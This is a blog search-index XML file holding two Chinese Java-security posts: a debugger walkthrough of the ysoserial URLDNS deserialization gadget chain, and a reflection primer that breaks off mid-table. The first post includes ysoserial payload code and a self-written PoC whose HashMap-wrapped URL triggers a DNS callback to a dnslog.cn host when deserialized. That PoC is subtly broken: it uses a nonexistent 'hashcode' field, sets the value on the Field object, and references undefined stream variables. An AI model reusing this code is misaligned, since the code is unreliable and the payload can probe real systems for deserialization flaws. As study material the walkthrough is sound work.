<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java安全-URLDNS链学习与分析</title>
      <link href="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>延伸java序列化和java反射的内容，针对一些gadget利用链的一些学习，理解一下利用链的分析过程。<br>本文学习URLDNS反序列化链，也是java反序列化利用链里面最简单的一条，也利用java反序列化和反射的相关知识，可把前两篇java基础学习的知识运用在利用链里面，记录下利用链相关知识点。</p><p>本文角度两个方面，一是从ysoserial工具利用URLDNS角度分析学习，另一个角度是从URLDNS利用链分析学习。</p><h1 id="0x01、URLDNS链简述"><a href="#0x01、URLDNS链简述" class="headerlink" title="0x01、URLDNS链简述"></a>0x01、URLDNS链简述</h1><p>URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果<font color=red>不是命令执⾏</font>，⽽是<font color=red>⼀次DNS请求</font>。</p><p>URLDNS通常用于快速监测是否存在反序列化漏洞，尤其对<strong>无回显的漏洞检测</strong>，原因：</p><ul><li>只依赖原生类</li><li>不限制jdk版本</li></ul><p>也就是说URLDN可直接调用java内置库即可进行操作，无需依赖其他第三方组件，同时不限制jdk版本不通带来的语言代码差异。</p><p>URLDNS链主要问题产生于HashMap,<font color=red>HashMap重写了readObject()反序列化方法，并且参数可控导致序列化漏洞</font>。</p><blockquote><p>HashMap简单介绍:<br>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。<br>HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。<br>HashMap 是无序的，即不会记录插入的顺序。<br>HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。</p></blockquote><h1 id="0x02、yso-URLDNS利用链分析"><a href="#0x02、yso-URLDNS利用链分析" class="headerlink" title="0x02、yso-URLDNS利用链分析"></a>0x02、yso-URLDNS利用链分析</h1><h2 id="ysoserial环境准备"><a href="#ysoserial环境准备" class="headerlink" title="ysoserial环境准备"></a>ysoserial环境准备</h2><p>运行环境：idea<br>java环境: jdk8<br>漏洞环境：ysoserial(<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>)</p><p>idea相关配置:<br>下载ysoserial漏洞环境后在idea打开项目，idea会自动同步pom.xml中的依赖，注意的点是，需要更改文件-项目结构-项目设置-项目中的sdk版本和sdk默认值，如下图即可，不然在编译上可能会报错。随后构建项目即可。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-1.png" title="项目结构"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-2.png" title="java环境"><br>通过pol.xml知道主程序位置<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-4.png" title="主程序"><br>在运行或者debug调试GeneratePayload.java文件，出现下面红色提示表示运行正常，项目部署成功，便可进行urldns链测试。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-3.png" title="运行部署"><br>运行-编辑配置里输入测试参数<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-7.png" title="运行部署"><br>相当于使用主程序直接执行命令<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-5.png" title="URLDNS序列化数据"></p><h2 id="yso-URLDNS链分析"><a href="#yso-URLDNS链分析" class="headerlink" title="yso-URLDNS链分析"></a>yso-URLDNS链分析</h2><p>yso生成URLDNS利用的序列化数据，主要为<code>URLDNS</code>、<code>url</code>两个参数<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-5.png" title="URLDNS序列化数据"><br>在主程序获取参数下断点<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-6.png" title="断点"><br>进行debug调试，参数<code>args[0]</code>即URLDNS传递给<code>payloadType</code>变量，参数<code>args[1]</code>即url传递给<code>command</code>变量<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-8.png" title="断点"></p><p>获取Class类对象，类为<code>GeneratePayload.class.getPackage().getName() + &quot;.payloads.&quot; + className</code>对应得就是<code>ysoserial.payloads.URLDNS</code>类<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-10.png" title="获取类对象"><br>对应返回给<code>payloadClass</code>对象<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-11.png" title="获取类对象"><br>接下来对<code>Class对象</code>进行实例化<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-12.png" title="实例化"><br>跟进<code>getObject()</code>方法，传递command参数也就是传入的url参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public Object getObject(final String url) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">               //Avoid DNS resolution during payload creation</span><br><span class="line">               //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br><span class="line">               URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">               HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">               URL u = new URL(null, url, handler); // URL to use as the Key</span><br><span class="line">               ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br><span class="line">               Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">               return ht;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-13.png" title="getObject方法"><br>getObject方法中建立了<code>URLStreamHandler</code>流对象和<code>HashMap</code>对象,其中handler对象为<code>URLStreamHandler</code>的子类<code>SilentURLStreamHandler</code><br><code>URLStreamHandler handler = new SilentURLStreamHandler();</code><br>这次调用的子类<code>SilentURLStreamHandler</code>方法，去规避生成序列化的过程中触发dns，因为调用子类在获取<code>getHostAddress</code>方法时返回<code>Null</code>,并不执行父类<code>URLStreamHandler</code>中的<code>getHostAddress()</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static class SilentURLStreamHandler extends URLStreamHandler &#123;</span><br><span class="line"></span><br><span class="line">        protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>生成<code>URL对象</code>，并将<code>url参数</code>和<code>URLStreamHandler</code>传入<code>URL对象</code>中<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-14.png" title="建立对象"><br>随后执行<code>HashMap</code>的<code>put()</code>方法,将<code>URL对象</code>作为<code>HashMap值</code>，将<code>url参数值</code>作为<code>key的值</code>存储在<code>HashMap</code>中<br><code>ht.put(u, url);</code><br>再通过反射机制将<code>URL对象</code>的<code>hashCode值</code>设置为-1<br><code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-15.png" title="调用反射机制"><br>最后返回HashMap对象ht<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-16.png" title="返回HashMap对象"><br>在获取HashMap对象后对其进行序列化操作，这边没有设置out定向输出的文件，out就没对应数值,对应命令行最后加<code> &gt; serialize.ser</code>。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-17.png" title="序列化操作"><br>由于<code>HashMap</code>对序列化<code>writeObject()</code>也进行了重写，所以会调用<code>HashMap</code>的序列化方法进行序列化操作，正常的序列化操作。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-18.png" title="序列化操作"><br>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>进行序列化写入<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-19.png" title="序列化操作"></p><p>到此ysoserial工具的URLDNS利用链就执行完成，输出payload序列化的数据。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-20.png" title="生成序列化文件"></p><h2 id="yso-URLDNS链反序列化"><a href="#yso-URLDNS链反序列化" class="headerlink" title="yso-URLDNS链反序列化"></a>yso-URLDNS链反序列化</h2><p>通过对输出的序列化数据，进行反序列化，触发漏洞。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-21.png" title="反序列化触发漏洞"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-22.png" title="DNSLOG接受到数据"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line">public class Payload &#123;</span><br><span class="line">    public static void main(final String[] args) throws Exception&#123;</span><br><span class="line">        ObjectInputStream obj=new ObjectInputStream(new FileInputStream(&quot;C:\\Users\\OKAY\\Desktop\\java-web\\ysoserial\\payload.ser&quot;));</span><br><span class="line">        obj.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03、URLDNS链反序列化分析"><a href="#0x03、URLDNS链反序列化分析" class="headerlink" title="0x03、URLDNS链反序列化分析"></a>0x03、URLDNS链反序列化分析</h1><h2 id="正常反序列化readObject阶段"><a href="#正常反序列化readObject阶段" class="headerlink" title="正常反序列化readObject阶段"></a>正常反序列化readObject阶段</h2><p>这里就跟着payload的反序列化进行分析下去吧，（当然也可以直接在HashMap重写的readObject方法进行下断点，可以直接分析反序列化触发的漏洞），这里从头来可以理解一下运行流程，但前些正常的反序列化过程比较长有些就略过了，记录下关键的步入点吧。<br>反序列化处下断点，debug运行<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-30.png" title="下断点"><br>运行后，需要强行步入（Alt+Shift+F7）readObject方法，注：步入会直接跳过<br>进入后，还需要再次强行步入进入readObject方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-31.png" title="readObject方法"><br>进入后，前面都是正常的一些判断，步过直到调用<code>readObject0()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-31.png" title="readObject0方法"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-32.png" title="readObject0方法"><br>进入readObject0()方法，然后又是一系列的正常操作和判断，再关注到TC的判断如下图，由于TC为Obeject对象，并非String类对象，所以判断为false，进入调用readOrdinaryObject方法（读取二进制数据）<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-33.png" title="readObject0方法"><br>进入readOrdinaryObject方法，这里读取序列化数据，并将序列化数据赋值给对象<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-34.png" title="readOrdinaryObject方法"><br>后面将对象进行实例化并进行一些判断操作，一直到进入<code>readSerialData</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-35.png" title="readOrdinaryObject方法"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-36.png" title="readSerialData方法"><br><code>readSerialData</code>方法对序列化数据进行读取，一直到调用<code>invokeReadObject</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-38.png" title="invokeReadObject方法"><br>通过反射invoke去判断对象是否有重写readObject方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-39.png" title="invokeReadObject方法"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-40.png" title="invokeReadObject方法"><br>返回<code>ma.invoke</code>，跟进查看<code>ma.invoke</code><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-41.png" title="invokeReadObject方法"><br>返回<code>delegate.invoke</code>,跟进<code>delegate.invoke</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-42.png" title="invokeReadObject方法"><br>获得返回<code>HashMap</code>重写的<code>readObject</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-43.png" title="invokeReadObject方法"><br>跟进返回的<code>invoke0</code>,便进入调用的<code>HashMap</code>重写的<code>readObject</code>方法<br>到这里，进入<code>HashMap</code>重写的<code>readObject()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-23.png" title="重写的readObject()方法"></p><h2 id="HashMap反序列化readObject阶段"><a href="#HashMap反序列化readObject阶段" class="headerlink" title="HashMap反序列化readObject阶段"></a>HashMap反序列化readObject阶段</h2><p>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>的值，并反序列化读取还原<code>key</code>和<code>value</code>的值，随后进行<code>hash()</code>运算保证唯一<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-24.png" title="获取key和value值"><br>跟进<code>hash()</code>,hash方法判断key是否为空，不为空就调用<code>URL</code>类中的<code>hashcode()</code>方法，key值为url如下图标识所示<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-25.png" title="hash()方法"><br>跟进当前<code>hashcode()</code>方法，会首先判断hashcode是否为-1,为-1则进入<code>URLStreamHandler流对象的hashcode()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-26.png" title="hashcode()方法"><br>流对象的<code>hashcode()</code>调用了<code>getHostAddress()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-27.png" title="hashcode()方法"><br>跟进<code>getHostAddress()</code>方法，返回u.getHostAddress()，从而请求dnslog，导致漏洞触发。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-28.png" title="getHostAddress()"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-29.png" title="dnslog请求"><br>到此URLDNS链的反序列化触发访问dnslog就完成。</p><h2 id="总结URLDNS反序列化链流程"><a href="#总结URLDNS反序列化链流程" class="headerlink" title="总结URLDNS反序列化链流程"></a>总结URLDNS反序列化链流程</h2><ol><li><code>ObjectInputStream</code>读取<code>HashMap</code>的序列化文件</li><li>通过正常<code>Object</code>流<code>readObject</code>反序列化文件获取二进制数据</li><li>对二进制序列化数据进行读取并建立实例对象</li><li>通过对实例对象判断是否存在重写方法</li><li>获取到<code>HashMap</code>对象重写反序列化<code>readObject</code>方法，跳转执行该对象的<code>readObject</code>方法。</li><li>遍历序列化<code>Key</code>和<code>value</code>值，进行<code>hash</code>运算</li><li><code>hash</code>方法中<code>key</code>不为空时，调用<code>URL</code>类的<code>hashcode</code>方法</li><li>当<code>hashcode</code>等于-1时，调用<code>URLStreamHandler</code>流的<code>hashcode</code>方法</li><li><code>hashcode</code>方法中调用了<code>getHostAddress()</code>方法</li><li><code>getHostAddress()</code>方法返回<code>getHostAddress()</code>，触发DNSLOG请求</li></ol><p><strong>其中步骤1-5为正常反序列化的读取步骤，6-10为获取HashMap对象执行重写readObject方法步骤。</strong></p><h1 id="0x04、POC编写"><a href="#0x04、POC编写" class="headerlink" title="0x04、POC编写"></a>0x04、POC编写</h1><p>通过上述过程可以理出来代码重要步骤。<br>主要生成HashMap对象和URL对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap hm=new HashMap();</span><br><span class="line">URL u=new URL(&quot;http://yuk9sy.dnslog.cn&quot;);</span><br></pre></td></tr></table></figure><p>并通过反射控制URL类中hashcode的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Field code = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashcode&quot;);  //通过反射去控制hashcode值</span><br><span class="line">       code.setAccessible(true); //突破封装访问私有变量</span><br></pre></td></tr></table></figure><p>放入hashMap put值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hm.put(u,123);  //设置HashMap键值对</span><br></pre></td></tr></table></figure><p>通过设置hashcode为-1去触发dns请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code.set(code,-1);  //通过设置hashcode为-1去触发dns请求</span><br></pre></td></tr></table></figure><p>然后就是序列化HashMap对象，最后反序列化。<br>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(final String[] args) throws Exception&#123;</span><br><span class="line">        HashMap hm=new HashMap(); //创建HashMap对象</span><br><span class="line">        URL u=new URL(&quot;http://yuk9sy.dnslog.cn&quot;); //创建URL对象</span><br><span class="line">        Field code = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashcode&quot;);  //通过反射去控制hashcode值</span><br><span class="line">        code.setAccessible(true); //突破封装访问私有变量</span><br><span class="line">        code.set(code,1); //将hashcode设置不为-1，避免在序列化生成过程触发dns</span><br><span class="line">        hm.put(u,123);  //设置HashMap键值对</span><br><span class="line">        code.set(code,-1); //将hashcode值设置为-1 , 确保在反序列化的时候触发dns</span><br><span class="line"></span><br><span class="line">        try&#123;</span><br><span class="line">            //序列化过程</span><br><span class="line">            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./payload.ser&quot;));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            //反序列化过程</span><br><span class="line">            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./payload.ser&quot;));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w">https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w</a><br><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识java反射</title>
      <link href="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/"/>
      <url>/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>学习java基础知识记录，方便查阅。</p><h1 id="0x01、反射基础"><a href="#0x01、反射基础" class="headerlink" title="0x01、反射基础"></a>0x01、反射基础</h1><h2 id="一、反射概念"><a href="#一、反射概念" class="headerlink" title="一、反射概念"></a>一、反射概念</h2><blockquote><p>java执行分为<font color=red>编译期</font>和<font color=red>运行期</font><br><font color=red>编译期</font>是指把源码交给编译器编译成计算机可以执行的文件的过程。在 Java 中也就是把 Java 代码编成 class 文件的过程。编译期只是做了一些翻译功能，并没有把代码放在内存中运行起来，而只是把代码当成文本进行操作，比如检查错误。</p><p><font color=red>运行期</font>是把编译后的文件交给计算机执行，直到程序运行结束。所谓运行期就把在磁盘中的代码放到内存中执行起来。</p></blockquote><p>Java 反射机制是在<font color=red>运行状态</font>中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制。简单来说，反射机制指的是程序在运行时能够获取自身的信息。在 Java 中，只要给定类的名字，就可以通过反射机制来获得类的所有信息。</p><p><strong>Java 反射机制主要提供了以下功能，这些功能都位于<code>java.lang.reflect</code>包。</strong></p><ul><li>在运行时判断任意一个对象所属的类。</li><li>在运行时构造任意一个类的对象。</li><li>在运行时判断任意一个类所具有的成员变量和方法。</li><li>在运行时调用任意一个对象的方法。</li><li>生成动态代理。</li></ul><p><strong>反射与常用引用类对象区别</strong><br>正常方式：引入对应的包类名称——&gt;通过new实例化——&gt;获取实例化对象<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-1.png" title="正常实现"></p><p>反射方式：实例化类对象——&gt;Class获取方法——&gt;得到完整的包类名称<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-4.png" title="反射实现"></p><p><strong>Java反射机制的优缺点</strong><br>优点：</p><ul><li>能够运行时<font color=red>动态获取类的实例</font>，大大提高系统的<font color=red>灵活性</font>和<font color=red>扩展性</font>。</li><li>与Java动态编译相结合，可以实现无比强大的功能。</li><li>降低代码程序之间的依赖性。</li><li>对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</li></ul><p>缺点：</p><ul><li>反射会<font color=red>消耗一定的系统资源</font>，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</li><li>冗余了很多代码量。</li><li>反射调用方法时可以忽略权限检查，获取这个类的私有方法和属性，因此可能会破坏类的封装性而导致安全问题。</li></ul><h2 id="二、反射实现"><a href="#二、反射实现" class="headerlink" title="二、反射实现"></a>二、反射实现</h2><h3 id="1、总结简述"><a href="#1、总结简述" class="headerlink" title="1、总结简述"></a>1、总结简述</h3><font color=red><p><strong>1、通过Class类获取类。</strong><br><strong>2、通过newInstance()对类进行实例化。</strong><br><strong>3、通过Field访问成员变量|通过Method访问成员方法|通过Constructor访问成员构造方法</strong></p></font><p><strong>反射机制重要的类</strong></p><table><thead><tr><th align="center">类</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">java.lang.Class</td><td align="left">代表整个字节码。代表一个类型，代表整个类。</td></tr><tr><td align="center">java.lang.reflect.Method</td><td align="left">代表字节码中的方法字节码。代表类中的方法。</td></tr><tr><td align="center">java.lang.reflect.Constructor</td><td 